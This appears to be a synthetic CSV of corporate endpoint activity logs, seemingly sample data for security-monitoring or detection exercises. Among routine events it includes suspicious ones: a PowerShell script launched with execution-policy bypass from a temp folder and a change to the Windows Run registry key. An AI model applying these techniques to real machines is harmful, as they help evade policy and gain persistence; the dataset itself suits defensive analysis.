log_id,timestamp,user_id,asset_id,activity_type,details
1,2023-10-26T13:00:02Z,jsmith,1,file-access,"Accessed C:\Users\jsmith\Documents\report.docx"
2,2023-10-26T13:01:10Z,jdoe,3,application-run,"Launched C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
3,2023-10-26T13:02:15Z,rjohnson,6,file-write,"Modified \\fileserver\shared\project_x\plan.xlsx"
4,2023-10-26T13:03:28Z,ewilliams,8,login,"Successful login from 192.168.1.14"
5,2023-10-26T13:04:45Z,mbrown,10,process-create,"powershell.exe -ExecutionPolicy Bypass -File C:\temp\script.ps1"
6,2023-10-26T13:05:50Z,jgarcia,11,logout,"User jgarcia logged off"
7,2023-10-26T13:06:32Z,dmiller,13,file-delete,"Deleted C:\Users\dmiller\Downloads\old_file.zip"
8,2023-10-26T13:07:21Z,srodriguez,15,application-run,"Launched C:\Program Files\Google\Chrome\Application\chrome.exe"
9,2023-10-26T13:08:18Z,dmartinez,16,network-share-access,"Accessed share \\fileserver\public"
10,2023-10-26T13:09:09Z,chernandez,18,registry-modify,"Modified HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
11,2023-10-26T13:10:11Z,elopez,20,print-job,"Printed document 'confidential-report.pdf' on PRINTER-01"
12,2023-10-26T13:11:29Z,wgonzalez,21,file-upload,"Uploaded 'design_mockup.png' to webapp.corp.com/upload"
13,2023-10-26T13:12:38Z,lperez,23,application-install,"Installation of 'vlc-3.0.16-win64.exe' started"
14,2023-10-26T13:13:42Z,jwilson,26,file-read,"Read data from \\db-server\finance_db\customer_table"
15,2023-10-26T13:14:55Z,sanderson,28,process-terminate,"Terminated process 'hung_app.exe' (PID: 1234)"
16,2023-10-26T13:15:43Z,ttaylor,30,login-failure,"Failed login attempt for user ttaylor from 203.0.113.15"
17,2023-10-26T13:16:30Z,cmoore,31,usb-insert,"USB Mass Storage Device detected (Kingston DataTraveler)"
